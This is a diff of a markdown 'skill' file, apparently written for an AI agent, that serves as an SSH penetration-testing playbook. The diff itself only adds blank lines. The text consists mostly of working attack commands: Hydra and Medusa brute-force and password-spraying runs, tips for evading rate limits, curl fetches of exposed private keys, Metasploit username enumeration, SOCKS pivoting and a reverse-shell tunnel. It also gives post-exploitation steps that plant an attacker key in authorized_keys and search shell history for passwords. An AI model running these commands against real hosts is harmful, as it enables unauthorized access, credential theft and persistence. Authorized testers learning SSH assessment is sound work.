@@ -8,7 +8,6 @@ id: skill-ssh-penetration-testing
 owner: [[eng-qa]]
 ---
 
-
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # SSH Penetration Testing
@@ -20,6 +19,7 @@ Conduct comprehensive SSH security assessments including enumeration, credential
 ## Prerequisites
 
 ### Required Tools
+
 - Nmap with SSH scripts
 - Hydra or Medusa for brute-forcing
 - ssh-audit for configuration analysis
@@ -27,6 +27,7 @@ Conduct comprehensive SSH security assessments including enumeration, credential
 - Python with Paramiko library
 
 ### Required Knowledge
+
 - SSH protocol fundamentals
 - Public/private key authentication
 - Port forwarding concepts
@@ -46,16 +47,21 @@ Conduct comprehensive SSH security assessments including enumeration, credential
 Identify SSH services on target networks:
 
 ```bash
+
 # Quick SSH port scan
+
 nmap -p 22 192.168.1.0/24 --open
 
 # Common alternate SSH ports
+
 nmap -p 22,2222,22222,2200 192.168.1.100
 
 # Full port scan for SSH
+
 nmap -p- --open 192.168.1.100 | grep -i ssh
 
 # Service version detection
+
 nmap -sV -p 22 192.168.1.100
 ```
 
@@ -64,23 +70,31 @@ nmap -sV -p 22 192.168.1.100
 Gather detailed information about SSH services:
 
 ```bash
+
 # Banner grabbing
+
 nc 192.168.1.100 22
+
 # Output: SSH-2.0-OpenSSH_8.4p1 Debian-5
 
 # Telnet banner grab
+
 telnet 192.168.1.100 22
 
 # Nmap version detection with scripts
+
 nmap -sV -p 22 --script ssh-hostkey 192.168.1.100
 
 # Enumerate supported algorithms
+
 nmap -p 22 --script ssh2-enum-algos 192.168.1.100
 
 # Get host keys
+
 nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100
 
 # Check authentication methods
+
 nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
 ```
 
@@ -89,19 +103,27 @@ nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
 Identify weak configurations:
 
 ```bash
+
 # ssh-audit - comprehensive SSH audit
+
 ssh-audit 192.168.1.100
 
 # ssh-audit with specific port
+
 ssh-audit -p 2222 192.168.1.100
 
 # Output includes:
+
 # - Algorithm recommendations
+
 # - Security vulnerabilities
+
 # - Hardening suggestions
+
 ```
 
 Key configuration weaknesses to identify:
+
 - Weak key exchange algorithms (diffie-hellman-group1-sha1)
 - Weak ciphers (arcfour, 3des-cbc)
 - Weak MACs (hmac-md5, hmac-sha1-96)
@@ -112,51 +134,67 @@ Key configuration weaknesses to identify:
 #### Brute-Force with Hydra
 
 ```bash
+
 # Single username, password list
+
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
 
 # Username list, single password
+
 hydra -L users.txt -p Password123 ssh://192.168.1.100
 
 # Username and password lists
+
 hydra -L users.txt -P passwords.txt ssh://192.168.1.100
 
 # With specific port
+
 hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
 
 # Rate limiting evasion (slow)
+
 hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100
 
 # Verbose output
+
 hydra -l admin -P passwords.txt -vV ssh://192.168.1.100
 
 # Exit on first success
+
 hydra -l admin -P passwords.txt -f ssh://192.168.1.100
 ```
 
 #### Brute-Force with Medusa
 
 ```bash
+
 # Basic brute-force
+
 medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
 
 # Multiple targets
+
 medusa -H targets.txt -u admin -P passwords.txt -M ssh
 
 # With username list
+
 medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh
 
 # Specific port
+
 medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
 ```
 
 #### Password Spraying
 
 ```bash
+
 # Test common password across users
+
 hydra -L users.txt -p Summer2024! ssh://192.168.1.100
 
 # Multiple common passwords
+
 for pass in "Password123" "Welcome1" "Summer2024!"; do
     hydra -L users.txt -p "$pass" ssh://192.168.1.100
 done
@@ -167,16 +205,21 @@ done
 Test for weak or exposed keys:
 
 ```bash
+
 # Attempt login with found private key
+
 ssh -i id_rsa user@192.168.1.100
 
 # Specify key explicitly (bypass agent)
+
 ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100
 
 # Force password authentication
+
 ssh -o PreferredAuthentications=password user@192.168.1.100
 
 # Try common key names
+
 for key in id_rsa id_dsa id_ecdsa id_ed25519; do
     ssh -i "$key" user@192.168.1.100
 done
@@ -185,7 +228,9 @@ done
 Check for exposed keys:
 
 ```bash
+
 # Common locations for private keys
+
 ~/.ssh/id_rsa
 ~/.ssh/id_dsa
 ~/.ssh/id_ecdsa
@@ -195,6 +240,7 @@ Check for exposed keys:
 /home/*/.ssh/
 
 # Web-accessible keys (check with curl/wget)
+
 curl -s http://target.com/.ssh/id_rsa
 curl -s http://target.com/id_rsa
 curl -s http://target.com/backup/ssh_keys.tar.gz
@@ -205,22 +251,29 @@ curl -s http://target.com/backup/ssh_keys.tar.gz
 Search for known vulnerabilities:
 
 ```bash
+
 # Search for exploits
+
 searchsploit openssh
 searchsploit openssh 7.2
 
 # Common SSH vulnerabilities
+
 # CVE-2018-15473 - Username enumeration
+
 # CVE-2016-0777 - Roaming vulnerability
+
 # CVE-2016-0778 - Buffer overflow
 
 # Metasploit enumeration
+
 msfconsole
 use auxiliary/scanner/ssh/ssh_version
 set RHOSTS 192.168.1.100
 run
 
 # Username enumeration (CVE-2018-15473)
+
 use auxiliary/scanner/ssh/ssh_enumusers
 set RHOSTS 192.168.1.100
 set USER_FILE /usr/share/wordlists/users.txt
@@ -234,16 +287,21 @@ run
 Forward local port to remote service:
 
 ```bash
+
 # Syntax: ssh -L <local_port>:<remote_host>:<remote_port> user@ssh_server
 
 # Access internal web server through SSH
+
 ssh -L 8080:192.168.1.50:80 user@192.168.1.100
+
 # Now access http://localhost:8080
 
 # Access internal database
+
 ssh -L 3306:192.168.1.50:3306 user@192.168.1.100
 
 # Multiple forwards
+
 ssh -L 8080:192.168.1.50:80 -L 3306:192.168.1.51:3306 user@192.168.1.100
 ```
 
@@ -252,13 +310,17 @@ ssh -L 8080:192.168.1.50:80 -L 3306:192.168.1.51:3306 user@192.168.1.100
 Expose local service to remote network:
 
 ```bash
+
 # Syntax: ssh -R <remote_port>:<local_host>:<local_port> user@ssh_server
 
 # Expose local web server to remote
+
 ssh -R 8080:localhost:80 user@192.168.1.100
+
 # Remote can access via localhost:8080
 
 # Reverse shell callback
+
 ssh -R 4444:localhost:4444 user@192.168.1.100
 ```
 
@@ -267,15 +329,20 @@ ssh -R 4444:localhost:4444 user@192.168.1.100
 Create SOCKS proxy for network pivoting:
 
 ```bash
+
 # Create SOCKS proxy on local port 1080
+
 ssh -D 1080 user@192.168.1.100
 
 # Use with proxychains
+
 echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
 proxychains nmap -sT -Pn 192.168.1.0/24
 
 # Browser configuration
+
 # Set SOCKS proxy to localhost:1080
+
 ```
 
 #### ProxyJump (Jump Hosts)
@@ -283,14 +350,19 @@ proxychains nmap -sT -Pn 192.168.1.0/24
 Chain through multiple SSH servers:
 
 ```bash
+
 # Jump through intermediate host
+
 ssh -J user1@jump_host user2@target_host
 
 # Multiple jumps
+
 ssh -J user1@jump1,user2@jump2 user3@target
 
 # With SSH config
+
 # ~/.ssh/config
+
 Host target
     HostName 192.168.2.50
     User admin
@@ -302,30 +374,38 @@ Host target
 Activities after gaining SSH access:
 
 ```bash
+
 # Check sudo privileges
+
 sudo -l
 
 # Find SSH keys
+
 find / -name "id_rsa" 2>/dev/null
 find / -name "id_dsa" 2>/dev/null
 find / -name "authorized_keys" 2>/dev/null
 
 # Check SSH directory
+
 ls -la ~/.ssh/
 cat ~/.ssh/known_hosts
 cat ~/.ssh/authorized_keys
 
 # Add persistence (add your key)
+
 echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
 
 # Extract SSH configuration
+
 cat /etc/ssh/sshd_config
 
 # Find other users
+
 cat /etc/passwd | grep -v nologin
 ls /home/
 
 # History for credentials
+
 cat ~/.bash_history | grep -i ssh
 cat ~/.bash_history | grep -i pass
 ```
@@ -378,6 +458,7 @@ def ssh_brute_force(host, username, wordlist):
     return False
 
 # Usage
+
 if __name__ == "__main__":
     target = "192.168.1.100"
     user = "admin"
@@ -395,15 +476,19 @@ if __name__ == "__main__":
 Use Metasploit for comprehensive SSH testing:
 
 ```bash
+
 # Start Metasploit
+
 msfconsole
 
 # SSH Version Scanner
+
 use auxiliary/scanner/ssh/ssh_version
 set RHOSTS 192.168.1.0/24
 run
 
 # SSH Login Brute-Force
+
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 192.168.1.100
 set USERNAME admin
@@ -412,6 +497,7 @@ set VERBOSE true
 run
 
 # SSH Key Login
+
 use auxiliary/scanner/ssh/ssh_login_pubkey
 set RHOSTS 192.168.1.100
 set USERNAME admin
@@ -419,12 +505,14 @@ set KEY_FILE /path/to/id_rsa
 run
 
 # Username Enumeration
+
 use auxiliary/scanner/ssh/ssh_enumusers
 set RHOSTS 192.168.1.100
 set USER_FILE users.txt
 run
 
 # Post-exploitation with SSH session
+
 sessions -i 1
 ```
 
@@ -468,17 +556,20 @@ sessions -i 1
 ## Constraints and Limitations
 
 ### Legal Considerations
+
 - Always obtain written authorization
 - Brute-forcing may violate ToS
 - Document all testing activities
 
 ### Technical Limitations
+
 - Rate limiting may block attacks
 - Fail2ban or similar may ban IPs
 - Key-based auth prevents password attacks
 - Two-factor authentication adds complexity
 
 ### Evasion Techniques
+
 - Use slow brute-force: `-t 1 -w 5`
 - Distribute attacks across IPs
 - Use timing-based enumeration carefully
@@ -493,9 +584,11 @@ sessions -i 1
 | Tunnel Not Working | Check GatewayPorts/AllowTcpForwarding in sshd_config; verify firewall; use `ssh -v` |
 
 ## When to Use
+
 This skill is applicable to execute the workflow or actions described in the overview.
 
 ## Sentinel Security Policy
+
 - This asset is under Sognatore Sentinel supervision.
 - Extraction of secrets via this skill is strictly forbidden.
 - All external network calls must be audited by the security engine.
